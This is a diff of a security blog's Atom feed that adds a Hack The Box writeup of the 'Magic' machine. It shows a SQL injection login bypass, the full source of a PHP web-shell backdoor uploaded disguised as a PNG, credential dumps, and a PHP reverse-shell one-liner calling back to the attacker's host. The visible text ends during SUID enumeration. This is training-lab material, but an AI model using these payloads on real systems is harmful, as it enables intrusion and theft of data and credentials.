@@ -1,5 +1,381 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-08-19T09:00:00+02:00</updated><entry><title>HTB: Traceback</title><link href="https://maggick.fr/2020/08/htb-traceback.html" rel="alternate"></link><published>2020-08-19T09:00:00+02:00</published><updated>2020-08-19T09:00:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-19:/2020/08/htb-traceback.html</id><summary type="html">&lt;p&gt;&lt;img alt="Traceback Card" class="align-left" src="/media/2020.08/traceback_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - security</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/security.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2020-08-29T08:50:00+02:00</updated><entry><title>HTB: Magic</title><link href="https://maggick.fr/2020/08/htb-magic.html" rel="alternate"></link><published>2020-08-29T08:50:00+02:00</published><updated>2020-08-29T08:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-08-29:/2020/08/htb-magic.html</id><summary type="html">&lt;p&gt;&lt;img alt="Magic card" class="align-left" src="/media/2020.08/magic_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/241"&gt;Magic&lt;/a&gt; publish by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/31190"&gt;TRX&lt;/a&gt; on April 18 2020.
+This box is classified as a medium machine but is quit easy.
+It involves a basic SQL injection, a magic file upload and a SUID binary.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.08/magic_card.png" alt="Magic card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.eu/home/machines/profile/241"&gt;Magic&lt;/a&gt; publish by
+&lt;a href="https://www.hackthebox.eu/home/users/profile/31190"&gt;TRX&lt;/a&gt; on April 18 2020.
+This box is classified as a medium machine but is quit easy.
+It involves a basic SQL injection, a magic file upload and a SUID binary.&lt;/p&gt;
+
+
+&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
+&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP).&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Mon Apr 20 11:14:29 2020 as: nmap -p- -oN nmap 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Host is up (0.016s latency).&lt;/span&gt;
+&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
+&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
+&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
+&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;# Nmap done at Mon Apr 20 11:14:42 2020 -- 1 IP address (1 host up) scanned in 12.63 seconds&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="ssh"&gt;SSH&lt;/h1&gt;
+&lt;p&gt;The SSH service accept only public key authentication. Therefore we won't be
+able to use any password found to connect to the SSH service.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh toto@10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;toto@10.10.10.185: Permission denied (publickey).&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="web"&gt;Web&lt;/h1&gt;
+&lt;p&gt;The website expose some picture gallery.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="main page" src="/media/2020.08/magic_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;The website announce that we need to login to upload new picture.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="login form" src="/media/2020.08/magic_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;Some mechanism forbid us to put space in our username and password. We fire up
+Burp and edit the request using the &lt;code&gt;Intercept&lt;/code&gt; function so that our post
+request look like the following&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /login.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;username=aa&amp;#39; or 1=1 -- &amp;amp;password=a&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We are then logged in and we can upload picture using the application.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="upload form" src="/media/2020.08/magic_03.png"&gt;&lt;/p&gt;
+&lt;p&gt;Obviously we want to upload some PHP file for instance
+&lt;code&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt;. We intercept the request with
+Burp and change the Content-Type to &lt;code&gt;image/png&lt;/code&gt; and the image name to
+&lt;code&gt;simple-backdoor.php.png&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Our request is blocked and the application send us the following message
+&lt;code&gt;&amp;lt;script&amp;gt;alert('What are you trying to do there?')&amp;lt;/script&amp;gt;&amp;lt;!DOCTYPE HTML&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;That where the name of the box is relevant. We need to add the
+PNG &lt;a href="https://en.wikipedia.org/wiki/List_of_file_signatures"&gt;magic number&lt;/a&gt; to
+our file.&lt;/p&gt;
+&lt;p&gt;Still using Burp we add &lt;code&gt;aaaaaaaa&lt;/code&gt; at the begging of our file.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Burp request with aaaaaaaa" src="/media/2020.08/magic_04.png"&gt;&lt;/p&gt;
+&lt;p&gt;Using the Raw editor in Burp we replace our &lt;code&gt;a&lt;/code&gt; (&lt;code&gt;61&lt;/code&gt;) by the PNG's magic number
+&lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Burp request with PNG's magic number" src="/media/2020.08/magic_05.png"&gt;&lt;/p&gt;
+&lt;p&gt;Our request now looks like the following (copy-pasting it will failed as the
+magic number will not correctly be copied):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /upload.php HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: multipart/form-data; boundary=---------------------------1971341748341881315972996739&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 692&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=gl7e03c4vb6ejee40tgeobjhfh&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------------------1971341748341881315972996739&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Disposition: form-data; name=&amp;quot;image&amp;quot;; filename=&amp;quot;simple-backdoor2.php.png&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: image/png&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PNG&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;if(isset($_REQUEST[&amp;#39;cmd&amp;#39;])){&lt;/span&gt;
+&lt;span class="code-line"&gt;        echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;        $cmd = ($_REQUEST[&amp;#39;cmd&amp;#39;]);&lt;/span&gt;
+&lt;span class="code-line"&gt;        system($cmd);&lt;/span&gt;
+&lt;span class="code-line"&gt;        echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;;&lt;/span&gt;
+&lt;span class="code-line"&gt;        die;&lt;/span&gt;
+&lt;span class="code-line"&gt;}&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;?&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------------------1971341748341881315972996739&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Disposition: form-data; name=&amp;quot;submit&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;Upload Image&lt;/span&gt;
+&lt;span class="code-line"&gt;-----------------------------1971341748341881315972996739--&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This "image" will be uploaded and we can then go to
+&lt;code&gt;http://10.10.10.185/images/uploads/simple-backdoor2.php&lt;/code&gt; to execute some
+commands on the system.&lt;/p&gt;
+&lt;p&gt;We start enumerating and found a &lt;code&gt;db.php5&lt;/code&gt; file containing the database
+credentials &lt;code&gt;theseus:iamkingtheseus&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /images/uploads/simple-backdoor2.php.png?cmd=cat+/var/www/Magic/db.php5 HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 2&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="code-line"&gt;Date: Wed, 22 Apr 2020 12:32:22 GMT&lt;/span&gt;
+&lt;span class="code-line"&gt;Server: Apache/2.4.29 (Ubuntu)&lt;/span&gt;
+&lt;span class="code-line"&gt;Vary: Accept-Encoding&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 961&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PNG&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class="code-line"&gt;class Database&lt;/span&gt;
+&lt;span class="code-line"&gt;{&lt;/span&gt;
+&lt;span class="code-line"&gt;    private static $dbName = &amp;#39;Magic&amp;#39; ;&lt;/span&gt;
+&lt;span class="code-line"&gt;    private static $dbHost = &amp;#39;localhost&amp;#39; ;&lt;/span&gt;
+&lt;span class="code-line"&gt;    private static $dbUsername = &amp;#39;theseus&amp;#39;;&lt;/span&gt;
+&lt;span class="code-line"&gt;    private static $dbUserPassword = &amp;#39;iamkingtheseus&amp;#39;;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    private static $cont  = null;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    public function __construct() {&lt;/span&gt;
+&lt;span class="code-line"&gt;        die(&amp;#39;Init function is not allowed&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;    }&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    public static function connect()&lt;/span&gt;
+&lt;span class="code-line"&gt;    {&lt;/span&gt;
+&lt;span class="code-line"&gt;        // One connection through whole application&lt;/span&gt;
+&lt;span class="code-line"&gt;        if ( null == self::$cont )&lt;/span&gt;
+&lt;span class="code-line"&gt;        {&lt;/span&gt;
+&lt;span class="code-line"&gt;            try&lt;/span&gt;
+&lt;span class="code-line"&gt;            {&lt;/span&gt;
+&lt;span class="code-line"&gt;                self::$cont =  new PDO( &amp;quot;mysql:host=&amp;quot;.self::$dbHost.&amp;quot;;&amp;quot;.&amp;quot;dbname=&amp;quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);&lt;/span&gt;
+&lt;span class="code-line"&gt;            }&lt;/span&gt;
+&lt;span class="code-line"&gt;            catch(PDOException $e)&lt;/span&gt;
+&lt;span class="code-line"&gt;            {&lt;/span&gt;
+&lt;span class="code-line"&gt;                die($e-&amp;gt;getMessage());&lt;/span&gt;
+&lt;span class="code-line"&gt;            }&lt;/span&gt;
+&lt;span class="code-line"&gt;        }&lt;/span&gt;
+&lt;span class="code-line"&gt;        return self::$cont;&lt;/span&gt;
+&lt;span class="code-line"&gt;    }&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;    public static function disconnect()&lt;/span&gt;
+&lt;span class="code-line"&gt;    {&lt;/span&gt;
+&lt;span class="code-line"&gt;        self::$cont = null;&lt;/span&gt;
+&lt;span class="code-line"&gt;    }&lt;/span&gt;
+&lt;span class="code-line"&gt;}&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;We can then use &lt;code&gt;mysqldump&lt;/code&gt; (which is strangely present on the box) to dump the
+content of all databases using the previous credentials. That give us the
+credentials for the web login form: &lt;code&gt;admin:Th3s3usW4sK1ng&lt;/code&gt;.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /images/uploads/simple-backdoor2.php.png?cmd=mysqldump+-piamkingtheseus+-u+theseus+--all-databases HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;HTTP/1.1 200 OK&lt;/span&gt;
+&lt;span class="code-line"&gt;Date: Wed, 22 Apr 2020 12:31:35 GMT&lt;/span&gt;
+&lt;span class="code-line"&gt;Server: Apache/2.4.29 (Ubuntu)&lt;/span&gt;
+&lt;span class="code-line"&gt;Vary: Accept-Encoding&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Length: 2201&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Content-Type: text/html; charset=UTF-8&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;PNG&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;pre&amp;gt;-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Host: localhost    Database:&lt;/span&gt;
+&lt;span class="code-line"&gt;-- ------------------------------------------------------&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Server version   5.7.29-0ubuntu0.18.04.1&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET NAMES utf8 */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40103 SET TIME_ZONE=&amp;#39;+00:00&amp;#39; */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE=&amp;#39;NO_AUTO_VALUE_ON_ZERO&amp;#39; */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Current Database: `Magic`&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;CREATE DATABASE /*!32312 IF NOT EXISTS*/ `Magic` /*!40100 DEFAULT CHARACTER SET latin1 */;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;USE `Magic`;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Table structure for table `login`&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;DROP TABLE IF EXISTS `login`;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET @saved_cs_client     = @@character_set_client */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET character_set_client = utf8 */;&lt;/span&gt;
+&lt;span class="code-line"&gt;CREATE TABLE `login` (&lt;/span&gt;
+&lt;span class="code-line"&gt;  `id` int(6) NOT NULL AUTO_INCREMENT,&lt;/span&gt;
+&lt;span class="code-line"&gt;  `username` varchar(50) NOT NULL,&lt;/span&gt;
+&lt;span class="code-line"&gt;  `password` varchar(100) NOT NULL,&lt;/span&gt;
+&lt;span class="code-line"&gt;  PRIMARY KEY (`id`),&lt;/span&gt;
+&lt;span class="code-line"&gt;  UNIQUE KEY `username` (`username`)&lt;/span&gt;
+&lt;span class="code-line"&gt;) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET character_set_client = @saved_cs_client */;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Dumping data for table `login`&lt;/span&gt;
+&lt;span class="code-line"&gt;--&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;LOCK TABLES `login` WRITE;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40000 ALTER TABLE `login` DISABLE KEYS */;&lt;/span&gt;
+&lt;span class="code-line"&gt;INSERT INTO `login` VALUES (1,&amp;#39;admin&amp;#39;,&amp;#39;Th3s3usW4sK1ng&amp;#39;);&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40000 ALTER TABLE `login` ENABLE KEYS */;&lt;/span&gt;
+&lt;span class="code-line"&gt;UNLOCK TABLES;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;&lt;/span&gt;
+&lt;span class="code-line"&gt;/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Dump completed on 2020-04-22  5:31:35&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;It is time to get a proper shell. We know that PHP is installed on the box (as
+the web application is using PHP). So we use a PHP reverse shell and run
+&lt;code&gt;nc -l -p 4242&lt;/code&gt; on our side.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;GET /images/uploads/simple-backdoor2.php.png?cmd=php+-r+&amp;#39;$sock%3dfsockopen(&amp;quot;10.10.14.226&amp;quot;,4242)%3bexec(&amp;quot;/bin/sh+-i+&amp;lt;%263+&amp;gt;%263+2&amp;gt;%263&amp;quot;)%3b&amp;#39; HTTP/1.1&lt;/span&gt;
+&lt;span class="code-line"&gt;Host: 10.10.10.185&lt;/span&gt;
+&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
+&lt;span class="code-line"&gt;Cookie: PHPSESSID=aakul5ai43vudv9rqhpfoedqcs&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;That will give us a reverse shell as &lt;code&gt;www-data&lt;/code&gt; without interactivity.
+Using &lt;code&gt;/usr/bin/script -qc /bin/bash /dev/null&lt;/code&gt; we get a better shell with
+interactivity and can simply change user with &lt;code&gt;su theseus&lt;/code&gt; and inputing his
+password &lt;code&gt;Th3s3usW4sK1ng&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then we can grab the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -l -p 4242&lt;/span&gt;
+&lt;span class="code-line"&gt;/bin/sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
+&lt;span class="code-line"&gt;$ /usr/bin/script -qc /bin/bash /dev/null&lt;/span&gt;
+&lt;span class="code-line"&gt;www-data@ubuntu:/var/www/Magic/images/uploads$ su theseus&lt;/span&gt;
+&lt;span class="code-line"&gt;su theseus&lt;/span&gt;
+&lt;span class="code-line"&gt;Password: Th3s3usW4sK1ng&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ cat ~/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;cat ~/user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;e0d993fb203a25ba31cee6d8aa2a612f&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;When looking at the SUID files we see that &lt;code&gt;sysinfo&lt;/code&gt; is quit recent.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;theseus@ubuntu:/var/www/Magic/images/uploads$ find / -perm -4000 -type f -exec ls -la {} 2&amp;gt;/dev/null \; | grep -v snap&lt;/span&gt;
+&lt;span class="code-line"&gt;&amp;lt;ype f -exec ls -la {} 2&amp;gt;/dev/null \; | grep -v snap&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-- 1 root dip 382696 Feb 11 07:05 /usr/sbin/pppd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 149080 Jan 31 09:18 /usr/bin/sudo&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 22528 Jun 28  2019 /usr/bin/arping&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 10312 Dec  9 02:03 /usr/bin/vmware-user-suid-wrapper&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-sr-x 1 root root 10232 Dec 18 00:15 /usr/lib/xorg/Xorg.wrap&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 26696 Jan  8 10:31 /bin/umount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 43088 Jan  8 10:31 /bin/mount&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su&lt;/span&gt;
+&lt;span class="code-line"&gt;-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping&lt;/span&gt;
